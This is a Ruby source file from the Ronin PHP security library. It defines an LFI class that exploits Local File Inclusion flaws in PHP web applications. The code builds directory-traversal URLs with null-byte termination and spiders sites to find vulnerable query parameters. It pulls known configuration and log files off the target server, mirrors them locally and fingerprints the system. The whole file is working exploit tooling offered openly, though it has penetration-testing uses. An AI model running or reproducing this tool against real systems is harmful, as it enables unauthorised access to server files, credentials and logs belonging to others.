#
# Ronin PHP - A Ruby library for Ronin that provides support for PHP
# related security tasks.
#
# Copyright (c) 2007-2010 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'ronin/php/lfi/exceptions/unknown_target'
require 'ronin/php/lfi/target'
require 'ronin/php/lfi/targets'
require 'ronin/php/lfi/file'
require 'ronin/extensions/uri'
require 'ronin/network/http'
require 'ronin/web/spider'
require 'ronin/path'

module Ronin
  module PHP
    class LFI

      # Maximum number of directories to escape
      MAX_UP = 15

      # The URL which is vulnerable
      attr_reader :url

      # The vulnerable query param
      attr_accessor :param

      # The path prefix
      attr_accessor :prefix

      # Number of directories to traverse up
      attr_accessor :up

      # Whether to terminate the LFI path with a null byte
      attr_accessor :terminate

      # Targeted Operating System (OS)
      attr_accessor :os

      #
      # Creates a new LFI object.
      #
      # @param [String, URI::HTTP] url
      #   The URL to exploit.
      #
      # @param [String, Symbol] param
      #   The query parameter to perform LFI on.
      #
      # @param [Hash] options
      #
      # @option options [String] :prefix
      #   Optional prefix for any Local File Inclusion path.
      #
      # @option options [Integer] :up (0)
      #   Number of directories to escape up.
      #
      # @option options [Boolean] :terminate (true)
      #   Specifies whether to terminate the LFI path with a null byte.
      #
      # @option options [String] :os
      #   Operating System to specifically target.
      #
      def initialize(url,param,options={})
        @url = url
        @param = param

        @prefix = options[:prefix]
        @up = (options[:up] || 0)

        if options.has_key?(:terminate)
          @terminate = options[:terminate]
        else
          @terminate = true
        end

        @os = options[:os]
      end

      def LFI.spider(url,options={},&block)
        lfis = []

        Web::Spider.site(url,options) do |spider|
          spider.every_url_like(/\?[a-zA-Z0-9_]/) do |vuln_url|
            found = vuln_url.test_lfi

            found.each(&block) if block
            lfis += found
          end
        end

        return lfis
      end

      #
      # @return [Boolean]
      #   Specifies whether the LFI path will be terminated with a null
      #   byte.
      #
      def terminate?
        @terminate == true
      end

      #
      # Builds a Local File Inclusion URL which includes a local path.
      #
      # @param [String] path
      #   The path of the local file to include.
      #
      # @return [URI::HTTP]
      #   The URL for the Local File Inclusion.
      #
      def url_for(path)
        escape = (@prefix || Path.up(@up))
        full_path = escape.join(path.to_s)
        full_path = "#{full_path}\0" if terminate?

        new_url = URI(@url.to_s)
        new_url.query_params[@param.to_s] = full_path

        return new_url
      end

      #
      # Requests the contents of a local file.
      #
      # @param [String] path
      #   The path of the local file to request.
      # 
      # @param [Hash] options
      #   Additional HTTP options to use when requesting the local file.
      #
      # @option options [Symbol] :method (:get)
      #   The HTTP method to request the local file. May be either
      #   `:get` or `:post`.
      #
      # @return [String]
      #   The body of the response.
      #
      # @see Net.http_get_body
      # @see Net.http_post_body
      #
      def get(path,options={})
        options = options.merge(:url => url_for(path))

        if options[:method] == :post
          return Net.http_post_body(options)
        else
          return Net.http_get_body(options)
        end
      end

      #
      # Requests the contents of a local file.
      #
      # @return [File]
      #   A File object representing the local file.
      #
      # @see get
      #
      def include(path,options={})
        File.new(path,get(path,options))
      end

      #
      # Include a local file commonly known by a given name.
      #
      # @param [String] name
      #   The common name of the local file to request.
      #
      # @param [Hash] options
      #   Additional inclusion options.
      #
      # @raise [UnknownTarget] Unable to load target information for the
      #                        file with the specified _name_.
      #
      # @see inclusion_of
      #
      def include_target(name,options={},&block)
        name = name.to_s
        target = Target.with_file(name)

        unless target
          raise(UnknownTarget,"unknown target file #{name.dump}",caller)
        end

        return inclusion_of(target,options,&block)
      end

      #
      # Saves a local file commonly known by a given name.
      #
      # @param [String] name
      #   The common name of the local file to save.
      #
      # @param [String] dest
      #   The destination path to save the local file to.
      #
      # @param [Hash] options
      #   Additional inclusion options.
      #
      # @see include_target
      # @see inclusion_of
      #
      def save_target(name,dest,options={})
        include_target(name,options) do |file|
          file.save(dest)
        end
      end

      #
      # Includes all targeted config and log files.
      #
      # @param [Hash] options
      #   Additional inclusion options.
      #
      # @return [Array<File>]
      #   The successfully included local files.
      #
      # @see inclusion_of
      #
      def include_targets(options={},&block)
        (Target.configs + Target.logs).map { |target|
          inclusion_of(target,options,&block)
        }.compact
      end

      #
      # Mirrors all targeted config and log files.
      #
      # @param [String] directory
      #   The directory to mirror all local files to.
      #
      # @param [Hash] options
      #   Additional inclusion options.
      #
      # @return [Array<String>]
      #   The desintation paths of the mirrored local files.
      #
      # @see include_targets
      #
      def mirror_targets(directory,options={})
        include_targets(options).map do |file|
          file.mirror(directory)
        end
      end

      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable
      #   to LFI.
      #
      def vulnerable?(options={})
        Target.tests.each do |target|
          inclusion_of(target) do |file|
            return true
          end
        end

        return false
      end

      #
      # Extracts information from all targeted files.
      #
      # @param [Hash] options
      #   Additional inclusion options.
      #
      # @option options [Array] :oses
      #   A list of OSes to test for.
      #
      # @return [Hash]
      #   The gathered information.
      #
      def fingerprint(options={})
        data = {}

        Target.with_extractors.each do |target|
          inclusion_of(target,options) do |file|
            data.merge!(target.extract_from(file.contents))
          end
        end

        return data
      end

      #
      # Converts the LFI to a String.
      #
      # @return [String]
      #   The URL being exploited.
      #
      def to_s
        @url.to_s
      end

      protected

      #
      # @param [String] target
      #   Commonly known name of a file.
      #
      # @return [Array<String>]
      #   The available paths of the specified target file.
      #
      def paths_of(target)
        if @os
          return target.paths_for(@os)
        else
          return target.all_paths
        end
      end

      #
      # Returns the File object obtained via a given target file.
      #
      # @param [String] target
      #   Commonly known name of a file.
      #
      # @param [Hash] options
      #   Additional inclusion options.
      #
      # @yield [file]
      #   If a block is given it will be passed the successfully
      #   included local file.
      #
      # @yieldparam [File] file
      #   The File representing the included local file.
      #
      # @return [File]
      #   The file representing the successfully included local file.
      #
      def inclusion_of(target,options={},&block)
        paths_of(target).each do |path|
          body = get(path,options)

          if target.included_in?(body)
            file = File.new(path,body)

            block.call(file) if block
            return file
          end
        end

        return nil
      end

    end
  end
end
